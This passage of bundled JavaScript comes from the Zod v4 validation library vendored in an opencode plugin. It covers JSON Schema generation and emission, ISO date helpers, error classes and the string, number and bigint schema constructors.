            }));
            const rest = def.rest ? this.process(def.rest, {
              ...params,
              path: [...params.path, restPath, ...this.target === "openapi-3.0" ? [def.items.length] : []]
            }) : null;
            if (this.target === "draft-2020-12") {
              json2.prefixItems = prefixItems;
              if (rest) {
                json2.items = rest;
              }
            } else if (this.target === "openapi-3.0") {
              json2.items = {
                anyOf: prefixItems
              };
              if (rest) {
                json2.items.anyOf.push(rest);
              }
              json2.minItems = prefixItems.length;
              if (!rest) {
                json2.maxItems = prefixItems.length;
              }
            } else {
              json2.items = prefixItems;
              if (rest) {
                json2.additionalItems = rest;
              }
            }
            const { minimum, maximum } = schema._zod.bag;
            if (typeof minimum === "number")
              json2.minItems = minimum;
            if (typeof maximum === "number")
              json2.maxItems = maximum;
            break;
          }
          case "record": {
            const json2 = _json;
            json2.type = "object";
            if (this.target === "draft-7" || this.target === "draft-2020-12") {
              json2.propertyNames = this.process(def.keyType, {
                ...params,
                path: [...params.path, "propertyNames"]
              });
            }
            json2.additionalProperties = this.process(def.valueType, {
              ...params,
              path: [...params.path, "additionalProperties"]
            });
            break;
          }
          case "map": {
            if (this.unrepresentable === "throw") {
              throw new Error("Map cannot be represented in JSON Schema");
            }
            break;
          }
          case "set": {
            if (this.unrepresentable === "throw") {
              throw new Error("Set cannot be represented in JSON Schema");
            }
            break;
          }
          case "enum": {
            const json2 = _json;
            const values = getEnumValues2(def.entries);
            if (values.every((v) => typeof v === "number"))
              json2.type = "number";
            if (values.every((v) => typeof v === "string"))
              json2.type = "string";
            json2.enum = values;
            break;
          }
          case "literal": {
            const json2 = _json;
            const vals = [];
            for (const val of def.values) {
              if (val === undefined) {
                if (this.unrepresentable === "throw") {
                  throw new Error("Literal `undefined` cannot be represented in JSON Schema");
                } else {}
              } else if (typeof val === "bigint") {
                if (this.unrepresentable === "throw") {
                  throw new Error("BigInt literals cannot be represented in JSON Schema");
                } else {
                  vals.push(Number(val));
                }
              } else {
                vals.push(val);
              }
            }
            if (vals.length === 0) {} else if (vals.length === 1) {
              const val = vals[0];
              json2.type = val === null ? "null" : typeof val;
              if (this.target === "draft-4" || this.target === "openapi-3.0") {
                json2.enum = [val];
              } else {
                json2.const = val;
              }
            } else {
              if (vals.every((v) => typeof v === "number"))
                json2.type = "number";
              if (vals.every((v) => typeof v === "string"))
                json2.type = "string";
              if (vals.every((v) => typeof v === "boolean"))
                json2.type = "string";
              if (vals.every((v) => v === null))
                json2.type = "null";
              json2.enum = vals;
            }
            break;
          }
          case "file": {
            const json2 = _json;
            const file2 = {
              type: "string",
              format: "binary",
              contentEncoding: "binary"
            };
            const { minimum, maximum, mime } = schema._zod.bag;
            if (minimum !== undefined)
              file2.minLength = minimum;
            if (maximum !== undefined)
              file2.maxLength = maximum;
            if (mime) {
              if (mime.length === 1) {
                file2.contentMediaType = mime[0];
                Object.assign(json2, file2);
              } else {
                json2.anyOf = mime.map((m) => {
                  const mFile = { ...file2, contentMediaType: m };
                  return mFile;
                });
              }
            } else {
              Object.assign(json2, file2);
            }
            break;
          }
          case "transform": {
            if (this.unrepresentable === "throw") {
              throw new Error("Transforms cannot be represented in JSON Schema");
            }
            break;
          }
          case "nullable": {
            const inner = this.process(def.innerType, params);
            if (this.target === "openapi-3.0") {
              result.ref = def.innerType;
              _json.nullable = true;
            } else {
              _json.anyOf = [inner, { type: "null" }];
            }
            break;
          }
          case "nonoptional": {
            this.process(def.innerType, params);
            result.ref = def.innerType;
            break;
          }
          case "success": {
            const json2 = _json;
            json2.type = "boolean";
            break;
          }
          case "default": {
            this.process(def.innerType, params);
            result.ref = def.innerType;
            _json.default = JSON.parse(JSON.stringify(def.defaultValue));
            break;
          }
          case "prefault": {
            this.process(def.innerType, params);
            result.ref = def.innerType;
            if (this.io === "input")
              _json._prefault = JSON.parse(JSON.stringify(def.defaultValue));
            break;
          }
          case "catch": {
            this.process(def.innerType, params);
            result.ref = def.innerType;
            let catchValue;
            try {
              catchValue = def.catchValue(undefined);
            } catch {
              throw new Error("Dynamic catch values are not supported in JSON Schema");
            }
            _json.default = catchValue;
            break;
          }
          case "nan": {
            if (this.unrepresentable === "throw") {
              throw new Error("NaN cannot be represented in JSON Schema");
            }
            break;
          }
          case "template_literal": {
            const json2 = _json;
            const pattern = schema._zod.pattern;
            if (!pattern)
              throw new Error("Pattern not found in template literal");
            json2.type = "string";
            json2.pattern = pattern.source;
            break;
          }
          case "pipe": {
            const innerType = this.io === "input" ? def.in._zod.def.type === "transform" ? def.out : def.in : def.out;
            this.process(innerType, params);
            result.ref = innerType;
            break;
          }
          case "readonly": {
            this.process(def.innerType, params);
            result.ref = def.innerType;
            _json.readOnly = true;
            break;
          }
          case "promise": {
            this.process(def.innerType, params);
            result.ref = def.innerType;
            break;
          }
          case "optional": {
            this.process(def.innerType, params);
            result.ref = def.innerType;
            break;
          }
          case "lazy": {
            const innerType = schema._zod.innerType;
            this.process(innerType, params);
            result.ref = innerType;
            break;
          }
          case "custom": {
            if (this.unrepresentable === "throw") {
              throw new Error("Custom types cannot be represented in JSON Schema");
            }
            break;
          }
          case "function": {
            if (this.unrepresentable === "throw") {
              throw new Error("Function types cannot be represented in JSON Schema");
            }
            break;
          }
          default: {}
        }
      }
    }
    const meta3 = this.metadataRegistry.get(schema);
    if (meta3)
      Object.assign(result.schema, meta3);
    if (this.io === "input" && isTransforming2(schema)) {
      delete result.schema.examples;
      delete result.schema.default;
    }
    if (this.io === "input" && result.schema._prefault)
      (_a2 = result.schema).default ?? (_a2.default = result.schema._prefault);
    delete result.schema._prefault;
    const _result = this.seen.get(schema);
    return _result.schema;
  }
  emit(schema, _params) {
    const params = {
      cycles: _params?.cycles ?? "ref",
      reused: _params?.reused ?? "inline",
      external: _params?.external ?? undefined
    };
    const root = this.seen.get(schema);
    if (!root)
      throw new Error("Unprocessed schema. This is a bug in Zod.");
    const makeURI = (entry) => {
      const defsSegment = this.target === "draft-2020-12" ? "$defs" : "definitions";
      if (params.external) {
        const externalId = params.external.registry.get(entry[0])?.id;
        const uriGenerator = params.external.uri ?? ((id2) => id2);
        if (externalId) {
          return { ref: uriGenerator(externalId) };
        }
        const id = entry[1].defId ?? entry[1].schema.id ?? `schema${this.counter++}`;
        entry[1].defId = id;
        return { defId: id, ref: `${uriGenerator("__shared")}#/${defsSegment}/${id}` };
      }
      if (entry[1] === root) {
        return { ref: "#" };
      }
      const uriPrefix = `#`;
      const defUriPrefix = `${uriPrefix}/${defsSegment}/`;
      const defId = entry[1].schema.id ?? `__schema${this.counter++}`;
      return { defId, ref: defUriPrefix + defId };
    };
    const extractToDef = (entry) => {
      if (entry[1].schema.$ref) {
        return;
      }
      const seen = entry[1];
      const { ref, defId } = makeURI(entry);
      seen.def = { ...seen.schema };
      if (defId)
        seen.defId = defId;
      const schema2 = seen.schema;
      for (const key in schema2) {
        delete schema2[key];
      }
      schema2.$ref = ref;
    };
    if (params.cycles === "throw") {
      for (const entry of this.seen.entries()) {
        const seen = entry[1];
        if (seen.cycle) {
          throw new Error("Cycle detected: " + `#/${seen.cycle?.join("/")}/<root>` + '\n\nSet the `cycles` parameter to `"ref"` to resolve cyclical schemas with defs.');
        }
      }
    }
    for (const entry of this.seen.entries()) {
      const seen = entry[1];
      if (schema === entry[0]) {
        extractToDef(entry);
        continue;
      }
      if (params.external) {
        const ext = params.external.registry.get(entry[0])?.id;
        if (schema !== entry[0] && ext) {
          extractToDef(entry);
          continue;
        }
      }
      const id = this.metadataRegistry.get(entry[0])?.id;
      if (id) {
        extractToDef(entry);
        continue;
      }
      if (seen.cycle) {
        extractToDef(entry);
        continue;
      }
      if (seen.count > 1) {
        if (params.reused === "ref") {
          extractToDef(entry);
          continue;
        }
      }
    }
    const flattenRef = (zodSchema, params2) => {
      const seen = this.seen.get(zodSchema);
      const schema2 = seen.def ?? seen.schema;
      const _cached = { ...schema2 };
      if (seen.ref === null) {
        return;
      }
      const ref = seen.ref;
      seen.ref = null;
      if (ref) {
        flattenRef(ref, params2);
        const refSchema = this.seen.get(ref).schema;
        if (refSchema.$ref && (params2.target === "draft-7" || params2.target === "draft-4" || params2.target === "openapi-3.0")) {
          schema2.allOf = schema2.allOf ?? [];
          schema2.allOf.push(refSchema);
        } else {
          Object.assign(schema2, refSchema);
          Object.assign(schema2, _cached);
        }
      }
      if (!seen.isParent)
        this.override({
          zodSchema,
          jsonSchema: schema2,
          path: seen.path ?? []
        });
    };
    for (const entry of [...this.seen.entries()].reverse()) {
      flattenRef(entry[0], { target: this.target });
    }
    const result = {};
    if (this.target === "draft-2020-12") {
      result.$schema = "https://json-schema.org/draft/2020-12/schema";
    } else if (this.target === "draft-7") {
      result.$schema = "http://json-schema.org/draft-07/schema#";
    } else if (this.target === "draft-4") {
      result.$schema = "http://json-schema.org/draft-04/schema#";
    } else if (this.target === "openapi-3.0") {} else {
      console.warn(`Invalid target: ${this.target}`);
    }
    if (params.external?.uri) {
      const id = params.external.registry.get(schema)?.id;
      if (!id)
        throw new Error("Schema is missing an `id` property");
      result.$id = params.external.uri(id);
    }
    Object.assign(result, root.def);
    const defs = params.external?.defs ?? {};
    for (const entry of this.seen.entries()) {
      const seen = entry[1];
      if (seen.def && seen.defId) {
        defs[seen.defId] = seen.def;
      }
    }
    if (params.external) {} else {
      if (Object.keys(defs).length > 0) {
        if (this.target === "draft-2020-12") {
          result.$defs = defs;
        } else {
          result.definitions = defs;
        }
      }
    }
    try {
      return JSON.parse(JSON.stringify(result));
    } catch (_err) {
      throw new Error("Error converting schema to JSON.");
    }
  }
}
function toJSONSchema2(input, _params) {
  if (input instanceof $ZodRegistry2) {
    const gen2 = new JSONSchemaGenerator2(_params);
    const defs = {};
    for (const entry of input._idmap.entries()) {
      const [_, schema] = entry;
      gen2.process(schema);
    }
    const schemas3 = {};
    const external2 = {
      registry: input,
      uri: _params?.uri,
      defs
    };
    for (const entry of input._idmap.entries()) {
      const [key, schema] = entry;
      schemas3[key] = gen2.emit(schema, {
        ..._params,
        external: external2
      });
    }
    if (Object.keys(defs).length > 0) {
      const defsSegment = gen2.target === "draft-2020-12" ? "$defs" : "definitions";
      schemas3.__shared = {
        [defsSegment]: defs
      };
    }
    return { schemas: schemas3 };
  }
  const gen = new JSONSchemaGenerator2(_params);
  gen.process(input);
  return gen.emit(input, _params);
}
function isTransforming2(_schema, _ctx) {
  const ctx = _ctx ?? { seen: new Set };
  if (ctx.seen.has(_schema))
    return false;
  ctx.seen.add(_schema);
  const schema = _schema;
  const def = schema._zod.def;
  switch (def.type) {
    case "string":
    case "number":
    case "bigint":
    case "boolean":
    case "date":
    case "symbol":
    case "undefined":
    case "null":
    case "any":
    case "unknown":
    case "never":
    case "void":
    case "literal":
    case "enum":
    case "nan":
    case "file":
    case "template_literal":
      return false;
    case "array": {
      return isTransforming2(def.element, ctx);
    }
    case "object": {
      for (const key in def.shape) {
        if (isTransforming2(def.shape[key], ctx))
          return true;
      }
      return false;
    }
    case "union": {
      for (const option of def.options) {
        if (isTransforming2(option, ctx))
          return true;
      }
      return false;
    }
    case "intersection": {
      return isTransforming2(def.left, ctx) || isTransforming2(def.right, ctx);
    }
    case "tuple": {
      for (const item of def.items) {
        if (isTransforming2(item, ctx))
          return true;
      }
      if (def.rest && isTransforming2(def.rest, ctx))
        return true;
      return false;
    }
    case "record": {
      return isTransforming2(def.keyType, ctx) || isTransforming2(def.valueType, ctx);
    }
    case "map": {
      return isTransforming2(def.keyType, ctx) || isTransforming2(def.valueType, ctx);
    }
    case "set": {
      return isTransforming2(def.valueType, ctx);
    }
    case "promise":
    case "optional":
    case "nonoptional":
    case "nullable":
    case "readonly":
      return isTransforming2(def.innerType, ctx);
    case "lazy":
      return isTransforming2(def.getter(), ctx);
    case "default": {
      return isTransforming2(def.innerType, ctx);
    }
    case "prefault": {
      return isTransforming2(def.innerType, ctx);
    }
    case "custom": {
      return false;
    }
    case "transform": {
      return true;
    }
    case "pipe": {
      return isTransforming2(def.in, ctx) || isTransforming2(def.out, ctx);
    }
    case "success": {
      return false;
    }
    case "catch": {
      return false;
    }
    case "function": {
      return false;
    }
    default:
  }
  throw new Error(`Unknown schema type: ${def.type}`);
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/json-schema.js
var exports_json_schema2 = {};
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/classic/iso.js
var exports_iso2 = {};
__export(exports_iso2, {
  time: () => time4,
  duration: () => duration4,
  datetime: () => datetime4,
  date: () => date6,
  ZodISOTime: () => ZodISOTime2,
  ZodISODuration: () => ZodISODuration2,
  ZodISODateTime: () => ZodISODateTime2,
  ZodISODate: () => ZodISODate2
});
var ZodISODateTime2 = /* @__PURE__ */ $constructor2("ZodISODateTime", (inst, def) => {
  $ZodISODateTime2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function datetime4(params) {
  return _isoDateTime2(ZodISODateTime2, params);
}
var ZodISODate2 = /* @__PURE__ */ $constructor2("ZodISODate", (inst, def) => {
  $ZodISODate2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function date6(params) {
  return _isoDate2(ZodISODate2, params);
}
var ZodISOTime2 = /* @__PURE__ */ $constructor2("ZodISOTime", (inst, def) => {
  $ZodISOTime2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function time4(params) {
  return _isoTime2(ZodISOTime2, params);
}
var ZodISODuration2 = /* @__PURE__ */ $constructor2("ZodISODuration", (inst, def) => {
  $ZodISODuration2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function duration4(params) {
  return _isoDuration2(ZodISODuration2, params);
}

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/classic/errors.js
var initializer4 = (inst, issues) => {
  $ZodError2.init(inst, issues);
  inst.name = "ZodError";
  Object.defineProperties(inst, {
    format: {
      value: (mapper) => formatError2(inst, mapper)
    },
    flatten: {
      value: (mapper) => flattenError2(inst, mapper)
    },
    addIssue: {
      value: (issue3) => {
        inst.issues.push(issue3);
        inst.message = JSON.stringify(inst.issues, jsonStringifyReplacer2, 2);
      }
    },
    addIssues: {
      value: (issues2) => {
        inst.issues.push(...issues2);
        inst.message = JSON.stringify(inst.issues, jsonStringifyReplacer2, 2);
      }
    },
    isEmpty: {
      get() {
        return inst.issues.length === 0;
      }
    }
  });
};
var ZodError2 = $constructor2("ZodError", initializer4);
var ZodRealError2 = $constructor2("ZodError", initializer4, {
  Parent: Error
});

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/classic/parse.js
var parse7 = /* @__PURE__ */ _parse2(ZodRealError2);
var parseAsync4 = /* @__PURE__ */ _parseAsync2(ZodRealError2);
var safeParse4 = /* @__PURE__ */ _safeParse2(ZodRealError2);
var safeParseAsync4 = /* @__PURE__ */ _safeParseAsync2(ZodRealError2);
var encode4 = /* @__PURE__ */ _encode2(ZodRealError2);
var decode4 = /* @__PURE__ */ _decode2(ZodRealError2);
var encodeAsync4 = /* @__PURE__ */ _encodeAsync2(ZodRealError2);
var decodeAsync4 = /* @__PURE__ */ _decodeAsync2(ZodRealError2);
var safeEncode4 = /* @__PURE__ */ _safeEncode2(ZodRealError2);
var safeDecode4 = /* @__PURE__ */ _safeDecode2(ZodRealError2);
var safeEncodeAsync4 = /* @__PURE__ */ _safeEncodeAsync2(ZodRealError2);
var safeDecodeAsync4 = /* @__PURE__ */ _safeDecodeAsync2(ZodRealError2);

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/classic/schemas.js
var ZodType2 = /* @__PURE__ */ $constructor2("ZodType", (inst, def) => {
  $ZodType2.init(inst, def);
  inst.def = def;
  inst.type = def.type;
  Object.defineProperty(inst, "_def", { value: def });
  inst.check = (...checks4) => {
    return inst.clone({
      ...def,
      checks: [
        ...def.checks ?? [],
        ...checks4.map((ch) => typeof ch === "function" ? { _zod: { check: ch, def: { check: "custom" }, onattach: [] } } : ch)
      ]
    });
  };
  inst.clone = (def2, params) => clone2(inst, def2, params);
  inst.brand = () => inst;
  inst.register = (reg, meta3) => {
    reg.add(inst, meta3);
    return inst;
  };
  inst.parse = (data, params) => parse7(inst, data, params, { callee: inst.parse });
  inst.safeParse = (data, params) => safeParse4(inst, data, params);
  inst.parseAsync = async (data, params) => parseAsync4(inst, data, params, { callee: inst.parseAsync });
  inst.safeParseAsync = async (data, params) => safeParseAsync4(inst, data, params);
  inst.spa = inst.safeParseAsync;
  inst.encode = (data, params) => encode4(inst, data, params);
  inst.decode = (data, params) => decode4(inst, data, params);
  inst.encodeAsync = async (data, params) => encodeAsync4(inst, data, params);
  inst.decodeAsync = async (data, params) => decodeAsync4(inst, data, params);
  inst.safeEncode = (data, params) => safeEncode4(inst, data, params);
  inst.safeDecode = (data, params) => safeDecode4(inst, data, params);
  inst.safeEncodeAsync = async (data, params) => safeEncodeAsync4(inst, data, params);
  inst.safeDecodeAsync = async (data, params) => safeDecodeAsync4(inst, data, params);
  inst.refine = (check2, params) => inst.check(refine2(check2, params));
  inst.superRefine = (refinement) => inst.check(superRefine2(refinement));
  inst.overwrite = (fn) => inst.check(_overwrite2(fn));
  inst.optional = () => optional2(inst);
  inst.nullable = () => nullable2(inst);
  inst.nullish = () => optional2(nullable2(inst));
  inst.nonoptional = (params) => nonoptional2(inst, params);
  inst.array = () => array2(inst);
  inst.or = (arg) => union2([inst, arg]);
  inst.and = (arg) => intersection2(inst, arg);
  inst.transform = (tx) => pipe2(inst, transform2(tx));
  inst.default = (def2) => _default4(inst, def2);
  inst.prefault = (def2) => prefault2(inst, def2);
  inst.catch = (params) => _catch4(inst, params);
  inst.pipe = (target) => pipe2(inst, target);
  inst.readonly = () => readonly2(inst);
  inst.describe = (description) => {
    const cl = inst.clone();
    globalRegistry2.add(cl, { description });
    return cl;
  };
  Object.defineProperty(inst, "description", {
    get() {
      return globalRegistry2.get(inst)?.description;
    },
    configurable: true
  });
  inst.meta = (...args) => {
    if (args.length === 0) {
      return globalRegistry2.get(inst);
    }
    const cl = inst.clone();
    globalRegistry2.add(cl, args[0]);
    return cl;
  };
  inst.isOptional = () => inst.safeParse(undefined).success;
  inst.isNullable = () => inst.safeParse(null).success;
  return inst;
});
var _ZodString2 = /* @__PURE__ */ $constructor2("_ZodString", (inst, def) => {
  $ZodString2.init(inst, def);
  ZodType2.init(inst, def);
  const bag = inst._zod.bag;
  inst.format = bag.format ?? null;
  inst.minLength = bag.minimum ?? null;
  inst.maxLength = bag.maximum ?? null;
  inst.regex = (...args) => inst.check(_regex2(...args));
  inst.includes = (...args) => inst.check(_includes2(...args));
  inst.startsWith = (...args) => inst.check(_startsWith2(...args));
  inst.endsWith = (...args) => inst.check(_endsWith2(...args));
  inst.min = (...args) => inst.check(_minLength2(...args));
  inst.max = (...args) => inst.check(_maxLength2(...args));
  inst.length = (...args) => inst.check(_length2(...args));
  inst.nonempty = (...args) => inst.check(_minLength2(1, ...args));
  inst.lowercase = (params) => inst.check(_lowercase2(params));
  inst.uppercase = (params) => inst.check(_uppercase2(params));
  inst.trim = () => inst.check(_trim2());
  inst.normalize = (...args) => inst.check(_normalize2(...args));
  inst.toLowerCase = () => inst.check(_toLowerCase2());
  inst.toUpperCase = () => inst.check(_toUpperCase2());
});
var ZodString2 = /* @__PURE__ */ $constructor2("ZodString", (inst, def) => {
  $ZodString2.init(inst, def);
  _ZodString2.init(inst, def);
  inst.email = (params) => inst.check(_email2(ZodEmail2, params));
  inst.url = (params) => inst.check(_url2(ZodURL2, params));
  inst.jwt = (params) => inst.check(_jwt2(ZodJWT2, params));
  inst.emoji = (params) => inst.check(_emoji4(ZodEmoji2, params));
  inst.guid = (params) => inst.check(_guid2(ZodGUID2, params));
  inst.uuid = (params) => inst.check(_uuid2(ZodUUID2, params));
  inst.uuidv4 = (params) => inst.check(_uuidv42(ZodUUID2, params));
  inst.uuidv6 = (params) => inst.check(_uuidv62(ZodUUID2, params));
  inst.uuidv7 = (params) => inst.check(_uuidv72(ZodUUID2, params));
  inst.nanoid = (params) => inst.check(_nanoid2(ZodNanoID2, params));
  inst.guid = (params) => inst.check(_guid2(ZodGUID2, params));
  inst.cuid = (params) => inst.check(_cuid3(ZodCUID3, params));
  inst.cuid2 = (params) => inst.check(_cuid22(ZodCUID22, params));
  inst.ulid = (params) => inst.check(_ulid2(ZodULID2, params));
  inst.base64 = (params) => inst.check(_base642(ZodBase642, params));
  inst.base64url = (params) => inst.check(_base64url2(ZodBase64URL2, params));
  inst.xid = (params) => inst.check(_xid2(ZodXID2, params));
  inst.ksuid = (params) => inst.check(_ksuid2(ZodKSUID2, params));
  inst.ipv4 = (params) => inst.check(_ipv42(ZodIPv42, params));
  inst.ipv6 = (params) => inst.check(_ipv62(ZodIPv62, params));
  inst.cidrv4 = (params) => inst.check(_cidrv42(ZodCIDRv42, params));
  inst.cidrv6 = (params) => inst.check(_cidrv62(ZodCIDRv62, params));
  inst.e164 = (params) => inst.check(_e1642(ZodE1642, params));
  inst.datetime = (params) => inst.check(datetime4(params));
  inst.date = (params) => inst.check(date6(params));
  inst.time = (params) => inst.check(time4(params));
  inst.duration = (params) => inst.check(duration4(params));
});
function string5(params) {
  return _string2(ZodString2, params);
}
var ZodStringFormat2 = /* @__PURE__ */ $constructor2("ZodStringFormat", (inst, def) => {
  $ZodStringFormat2.init(inst, def);
  _ZodString2.init(inst, def);
});
var ZodEmail2 = /* @__PURE__ */ $constructor2("ZodEmail", (inst, def) => {
  $ZodEmail2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function email4(params) {
  return _email2(ZodEmail2, params);
}
var ZodGUID2 = /* @__PURE__ */ $constructor2("ZodGUID", (inst, def) => {
  $ZodGUID2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function guid4(params) {
  return _guid2(ZodGUID2, params);
}
var ZodUUID2 = /* @__PURE__ */ $constructor2("ZodUUID", (inst, def) => {
  $ZodUUID2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function uuid5(params) {
  return _uuid2(ZodUUID2, params);
}
function uuidv42(params) {
  return _uuidv42(ZodUUID2, params);
}
function uuidv62(params) {
  return _uuidv62(ZodUUID2, params);
}
function uuidv72(params) {
  return _uuidv72(ZodUUID2, params);
}
var ZodURL2 = /* @__PURE__ */ $constructor2("ZodURL", (inst, def) => {
  $ZodURL2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function url2(params) {
  return _url2(ZodURL2, params);
}
function httpUrl2(params) {
  return _url2(ZodURL2, {
    protocol: /^https?$/,
    hostname: exports_regexes2.domain,
    ...exports_util2.normalizeParams(params)
  });
}
var ZodEmoji2 = /* @__PURE__ */ $constructor2("ZodEmoji", (inst, def) => {
  $ZodEmoji2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function emoji4(params) {
  return _emoji4(ZodEmoji2, params);
}
var ZodNanoID2 = /* @__PURE__ */ $constructor2("ZodNanoID", (inst, def) => {
  $ZodNanoID2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function nanoid4(params) {
  return _nanoid2(ZodNanoID2, params);
}
var ZodCUID3 = /* @__PURE__ */ $constructor2("ZodCUID", (inst, def) => {
  $ZodCUID3.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function cuid6(params) {
  return _cuid3(ZodCUID3, params);
}
var ZodCUID22 = /* @__PURE__ */ $constructor2("ZodCUID2", (inst, def) => {
  $ZodCUID22.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function cuid24(params) {
  return _cuid22(ZodCUID22, params);
}
var ZodULID2 = /* @__PURE__ */ $constructor2("ZodULID", (inst, def) => {
  $ZodULID2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function ulid4(params) {
  return _ulid2(ZodULID2, params);
}
var ZodXID2 = /* @__PURE__ */ $constructor2("ZodXID", (inst, def) => {
  $ZodXID2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function xid4(params) {
  return _xid2(ZodXID2, params);
}
var ZodKSUID2 = /* @__PURE__ */ $constructor2("ZodKSUID", (inst, def) => {
  $ZodKSUID2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function ksuid4(params) {
  return _ksuid2(ZodKSUID2, params);
}
var ZodIPv42 = /* @__PURE__ */ $constructor2("ZodIPv4", (inst, def) => {
  $ZodIPv42.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function ipv44(params) {
  return _ipv42(ZodIPv42, params);
}
var ZodIPv62 = /* @__PURE__ */ $constructor2("ZodIPv6", (inst, def) => {
  $ZodIPv62.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function ipv64(params) {
  return _ipv62(ZodIPv62, params);
}
var ZodCIDRv42 = /* @__PURE__ */ $constructor2("ZodCIDRv4", (inst, def) => {
  $ZodCIDRv42.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function cidrv44(params) {
  return _cidrv42(ZodCIDRv42, params);
}
var ZodCIDRv62 = /* @__PURE__ */ $constructor2("ZodCIDRv6", (inst, def) => {
  $ZodCIDRv62.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function cidrv64(params) {
  return _cidrv62(ZodCIDRv62, params);
}
var ZodBase642 = /* @__PURE__ */ $constructor2("ZodBase64", (inst, def) => {
  $ZodBase642.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function base644(params) {
  return _base642(ZodBase642, params);
}
var ZodBase64URL2 = /* @__PURE__ */ $constructor2("ZodBase64URL", (inst, def) => {
  $ZodBase64URL2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function base64url4(params) {
  return _base64url2(ZodBase64URL2, params);
}
var ZodE1642 = /* @__PURE__ */ $constructor2("ZodE164", (inst, def) => {
  $ZodE1642.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function e1644(params) {
  return _e1642(ZodE1642, params);
}
var ZodJWT2 = /* @__PURE__ */ $constructor2("ZodJWT", (inst, def) => {
  $ZodJWT2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function jwt2(params) {
  return _jwt2(ZodJWT2, params);
}
var ZodCustomStringFormat2 = /* @__PURE__ */ $constructor2("ZodCustomStringFormat", (inst, def) => {
  $ZodCustomStringFormat2.init(inst, def);
  ZodStringFormat2.init(inst, def);
});
function stringFormat2(format, fnOrRegex, _params = {}) {
  return _stringFormat2(ZodCustomStringFormat2, format, fnOrRegex, _params);
}
function hostname4(_params) {
  return _stringFormat2(ZodCustomStringFormat2, "hostname", exports_regexes2.hostname, _params);
}
function hex4(_params) {
  return _stringFormat2(ZodCustomStringFormat2, "hex", exports_regexes2.hex, _params);
}
function hash2(alg, params) {
  const enc = params?.enc ?? "hex";
  const format = `${alg}_${enc}`;
  const regex = exports_regexes2[format];
  if (!regex)
    throw new Error(`Unrecognized hash format: ${format}`);
  return _stringFormat2(ZodCustomStringFormat2, format, regex, params);
}
var ZodNumber2 = /* @__PURE__ */ $constructor2("ZodNumber", (inst, def) => {
  $ZodNumber2.init(inst, def);
  ZodType2.init(inst, def);
  inst.gt = (value, params) => inst.check(_gt2(value, params));
  inst.gte = (value, params) => inst.check(_gte2(value, params));
  inst.min = (value, params) => inst.check(_gte2(value, params));
  inst.lt = (value, params) => inst.check(_lt2(value, params));
  inst.lte = (value, params) => inst.check(_lte2(value, params));
  inst.max = (value, params) => inst.check(_lte2(value, params));
  inst.int = (params) => inst.check(int2(params));
  inst.safe = (params) => inst.check(int2(params));
  inst.positive = (params) => inst.check(_gt2(0, params));
  inst.nonnegative = (params) => inst.check(_gte2(0, params));
  inst.negative = (params) => inst.check(_lt2(0, params));
  inst.nonpositive = (params) => inst.check(_lte2(0, params));
  inst.multipleOf = (value, params) => inst.check(_multipleOf2(value, params));
  inst.step = (value, params) => inst.check(_multipleOf2(value, params));
  inst.finite = () => inst;
  const bag = inst._zod.bag;
  inst.minValue = Math.max(bag.minimum ?? Number.NEGATIVE_INFINITY, bag.exclusiveMinimum ?? Number.NEGATIVE_INFINITY) ?? null;
  inst.maxValue = Math.min(bag.maximum ?? Number.POSITIVE_INFINITY, bag.exclusiveMaximum ?? Number.POSITIVE_INFINITY) ?? null;
  inst.isInt = (bag.format ?? "").includes("int") || Number.isSafeInteger(bag.multipleOf ?? 0.5);
  inst.isFinite = true;
  inst.format = bag.format ?? null;
});
function number5(params) {
  return _number2(ZodNumber2, params);
}
var ZodNumberFormat2 = /* @__PURE__ */ $constructor2("ZodNumberFormat", (inst, def) => {
  $ZodNumberFormat2.init(inst, def);
  ZodNumber2.init(inst, def);
});
function int2(params) {
  return _int2(ZodNumberFormat2, params);
}
function float322(params) {
  return _float322(ZodNumberFormat2, params);
}
function float642(params) {
  return _float642(ZodNumberFormat2, params);
}
function int322(params) {
  return _int322(ZodNumberFormat2, params);
}
function uint322(params) {
  return _uint322(ZodNumberFormat2, params);
}
var ZodBoolean2 = /* @__PURE__ */ $constructor2("ZodBoolean", (inst, def) => {
  $ZodBoolean2.init(inst, def);
  ZodType2.init(inst, def);
});
function boolean5(params) {
  return _boolean2(ZodBoolean2, params);
}
var ZodBigInt2 = /* @__PURE__ */ $constructor2("ZodBigInt", (inst, def) => {
  $ZodBigInt2.init(inst, def);
  ZodType2.init(inst, def);
  inst.gte = (value, params) => inst.check(_gte2(value, params));
  inst.min = (value, params) => inst.check(_gte2(value, params));
  inst.gt = (value, params) => inst.check(_gt2(value, params));
  inst.gte = (value, params) => inst.check(_gte2(value, params));
  inst.min = (value, params) => inst.check(_gte2(value, params));
  inst.lt = (value, params) => inst.check(_lt2(value, params));
  inst.lte = (value, params) => inst.check(_lte2(value, params));
  inst.max = (value, params) => inst.check(_lte2(value, params));
  inst.positive = (params) => inst.check(_gt2(BigInt(0), params));
  inst.negative = (params) => inst.check(_lt2(BigInt(0), params));
  inst.nonpositive = (params) => inst.check(_lte2(BigInt(0), params));
  inst.nonnegative = (params) => inst.check(_gte2(BigInt(0), params));
